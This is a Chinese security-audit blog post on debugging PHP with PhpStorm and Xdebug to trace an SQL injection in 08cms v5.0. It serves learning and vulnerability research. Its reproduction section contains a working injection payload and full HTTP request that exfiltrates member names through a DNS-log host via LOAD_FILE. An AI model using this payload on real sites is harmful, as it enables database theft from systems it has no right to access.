[i春秋作家：yanzm](https://bbs.ichunqiu.com/thread-37359-1-1.html?from=beef)

## 0x00 背景

本周，拿到一个源码素材是08cms的，这个源码在官网中没有开源下载，需要进行购买，由某师傅提供的，审计的时候发现这个CMS数据传递比较复杂，使用静态分析的方式不好操作，刚好这周小三上位(换了新电脑)，就直接安装下phpstorm+xdebug+xdebug-ext(火狐)进行动态分析，本篇主要是以SQL注入漏洞为例子，进行动态分析的演练，当然源码还有其他漏洞待挖掘，期待师傅们一起交流讨论。

## 0x01 审计过程

## 动态分析环境配置

动态分析组合：phpstorm+xdebug+xdebug-ext(火狐)

相信小伙伴们关注本公号这么久这个环境搭建应该是没问题了，这里我就列出几个配置要点。如果还有不明白的可以参考:[http://www.cnblogs.com/xujian2016/p/5548921.html](https://bbs.ichunqiu.com/thread-37359-1-1.html?from=beef)

##  **PHP的设置**

首先根据电脑的PHP版本下载适配的xdebug插件放在\php\php-5.3.29-nts\ext\php_xdebug-2.2.7-5.3-vc9-nts.dll，下载地址：[https://xdebug.org/download.php](https://bbs.ichunqiu.com/thread-37359-1-1.html?from=beef)

然后在PHP.ini文件中进行如下配置，配置完成后查看phpinfo中xdebug是否有生效。

[XDebug]

zend_extension="D:\soft\phpStudy\PHPTutorial\php\php-5.3.29-nts\ext\php_xdebug-2.2.7-5.3-vc9-nts.dll"

xdebug.profiler_append = 0

xdebug.profiler_enable = 1

xdebug.profiler_enable_trigger = 0

xdebug.profiler_output_dir="D:\soft\phpStudy\PHPTutorial\tmp\xdebug"

xdebug.trace_output_dir="D:\soft\phpStudy\PHPTutorial\tmp\xdebug"

xdebug.profiler_output_name = "cache.out.%t-%s"

xdebug.remote_enable = 1

xdebug.remote_handler = "dbgp"

xdebug.remote_host = "127.0.0.1"

xdebug.remote_port = 9000

xdebug.idekey = PHPSTORM

## phpstorm的设置

配置运行环境，加载php.exe所在的位置。

![image.png](https://image.3001.net/images/20180410/15233302637560.png!small)  

配置debug端口，默认是9000与php.ini中的debug端口一致即可。

![image.png](https://image.3001.net/images/20180410/15233302794426.png!small)  

  

配置proxy端口和IDE key，端口与站点端口一致即可。

![image.png](https://image.3001.net/images/20180410/15233302874527.png!small)  

在编辑结构处进行如下设置：

![image.png](https://image.3001.net/images/20180410/1523330299945.png!small)  

  
![image.png](https://image.3001.net/images/20180410/15233303064731.png!small)  

## xdebug-ext(火狐)

火狐最好使用开发者版本否则很多插件无法使用。

安装xdebug-ext插件后，在设置中配置好IDE key。

![image.png](https://image.3001.net/images/20180410/15233303176770.png!small)  

  
![image.png](https://image.3001.net/images/20180410/15233303236110.png!small)  

## 基本使用

在访问要调试的目标页面时候开启phpstorm的debug连接监听，就是那个小电话。

![image.png](https://image.3001.net/images/20180410/15233303324894.png!small)  

然后火狐浏览器开启那个小瓢虫。

![image.png](https://image.3001.net/images/20180410/15233303572989.png!small)  

开启后进行请求就会自动打上XDEBUG_SESSION=PHPSTORM,IDE 就能进行调试。

![image.png](https://image.3001.net/images/20180410/15233303632398.png!small)  

## SQL 注入问题

## 0x00 相关环境

源码信息：08cms_v5.0_gbk_20140314

问题文件： \08cms\08cms_v5.0_gbk_20140314\upload_gbk\include\field.fun.php

漏洞类型：SQL注入问题

站点地址：[http://www.08cms.com/](https://bbs.ichunqiu.com/thread-37359-1-1.html?from=beef)

## 0x01 漏洞分析

这个08cms的源码素材数据传递比较复杂，所以没有像之前使用notepad++进行静态跟踪和审计的方法，而是采用phpstorm+xdebug+xdebug-ext(火狐)的组合，进行动态分析和数据流的跟踪。

在站点注册会员后登录到会员中心。

![image.png](https://image.3001.net/images/20180410/15233304153894.png!small)  

在左侧基本信息->基本资料->会员详情->上传附件上面的输入框中，经过简要的测试，知道这个地方是上传后的图片路径。

![image.png](https://image.3001.net/images/20180410/15233304222019.png!small)  

本着见框就插习惯(存放路径的输入框代码规则的复杂)，开始进行测试，发现这个位置可以引入单引号。

![image.png](https://image.3001.net/images/20180410/15233304293364.png!small)

  
![image.png](https://image.3001.net/images/20180410/15233304367911.png!small)  

但是在构造SQL语句的时候发现，这个位置有对输入的数据进行处理，所以黑盒的方式不好构造Payload，因此开始进行debug，由于提交的表单链接是[http://127.0.0.1:8081/adminm.php?action=memberinfo_pthy∣=2](https://bbs.ichunqiu.com/thread-37359-1-1.html?from=beef),因此我在文件\08cms\08cms_v5.0_gbk_20140314\upload_gbk\adminm.php中的第10行设置断点。

![image.png](https://image.3001.net/images/20180410/15233304437435.png!small)  

首先在phpstorm中开启电话标记，监听debug连接。

![image.png](https://image.3001.net/images/20180410/15233304521060.png!small)  

然后表单提交，开启xdebug-ext(火狐)后会自动打上debug的IDE Key，然后一路F8步过，知道运行到断点处F7步入，然后还是一路F8。

![image.png](https://image.3001.net/images/20180410/15233304591453.png!small)  

在第2次进入\08cms\08cms_v5.0_gbk_20140314\upload_gbk\libs\classes\frontpage\adminmpagebase.cls.php文件中的第15行运行完就结束，且结束后通过查看SQL日志，才出现那条可以引入单引号的SQL，因此在这个位置下断点。

![image.png](https://image.3001.net/images/20180410/15233304672365.png!small)

  
![image.png](https://image.3001.net/images/20180410/1523330473136.png!small)  

经过反复的下断点F8步过和F7步入，遇到运行结束的位置下断点，在下次代码执行到该位置的时候F7步入。最终追踪到有问题的代码块。

![image.png](https://image.3001.net/images/20180410/15233304801058.png!small)  

如下是我跟踪的时候下的断点位置，把这些位置串起来便是代码运行和数据传递的过程。

![image.png](https://image.3001.net/images/20180410/15233304875664.png!small)  

当确认问题代码位置后，可以将其他断点去掉，然后仅保留，关键位置的断点，\08cms\08cms_v5.0_gbk_20140314\upload_gbk\include\field.fun.php这里我只保留第150的断点。

通过分析代码块，debug的时候会把变量的值展示在代码右侧，发现会对|和#进行处理，然后进行basename处理后传入SQL语句，08cms是会对传入的参数进行单引号的转义，此处虽然单引号被转义了但是由于经过了basename，导致反斜杠被吃掉，从而将单引号引入到SQL语句中，造成了SQL注入。

![image.png](https://image.3001.net/images/20180410/15233304976673.png!small)  

## 0x02 漏洞复现

可以进行如下请求，在fmdata[mlogo]位置'union select LOAD_FILE(CONCAT(0x5c5c,(select
hex(GROUP_CONCAT(mname)) from cms_members where 1 LIMIT
1),0x2e6d7973716c2e38353731653539342e326d312e70772f2f616263))--传入这个payload，可以查询数据库中的数据，这里需要注意，构造payload的时候除了开头的单引号，其他位置要避免使用单引号，否则由于单引号被转义为\',经过basename后会破坏语句的结构。

  

POST [url]http://127.0.0.1:8081/adminm.php?action=memberinfo_pthy∣=2[/url]
HTTP/1.1

Host: 127.0.0.1:8081

Proxy-Connection: keep-alive

Content-Length: 1563

Cache-Control: max-age=0

Origin: [url]http://127.0.0.1:8081[/url]

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/55.0.2883.87 Safari/537.36

Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryHubb3mAjcyGbJR0q

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Referer: [url]http://127.0.0.1:8081/adminm.php?action=memberinfo_pthy[/url]

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.8

Cookie:
VGM_userauth=iCWfvAR8iseJ5T3P9bVHw%2BZLTvqmLhL8vMS0IIj3ZoEOL2%2Fa%2Fax8vtdH

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="_08_hash"

5228bb59d0b24b049a00dbc1c21fae97

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[nicename]"

Thinking

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[mlogo]"

[url]http://127.0.0.1:8081/userfiles/image/20180328/'union[/url] select
LOAD_FILE(CONCAT(0x5c5c,(select hex(GROUP_CONCAT(mname)) from cms_members
where 1 LIMIT 1),0x2e6d7973716c2e38353731653539342e326d312e70772f2f616263))--1a=28164700edc421674c5194.jpg

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[phone]"

18988888888

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[email]"

[email]thinking@qq.com[/email]

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[qq]"

88888888

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[coid20]"

0

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[birthday]"

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[**]"

1

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[education]"

1

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="fmdata[profession]"

\------WebKitFormBoundaryHubb3mAjcyGbJR0q

Content-Disposition: form-data; name="bsubmit"

{

\------WebKitFormBoundaryHubb3mAjcyGbJR0q--
  

请求后查看DNSlog可以获取到查询数据。

![image.png](https://image.3001.net/images/20180410/15233305349876.png!small)  

## 0x02 小结

本篇以08cms
SQL注入漏洞为例子与大家分享下我使用的动态分析方式，也有师傅推荐使用vscode，看大家的使用习惯了，我是习惯使用phpstorm，如果师傅们还有其他好的审计方法也可提出，欢迎提供审计素材一起学习进步，但是如果是hc请走开勿扰，交流学习可联系我。

  

注：本文仅限于学习和研究使用，禁止用于非法用途。一切非法用途，与原作者无关。  

  

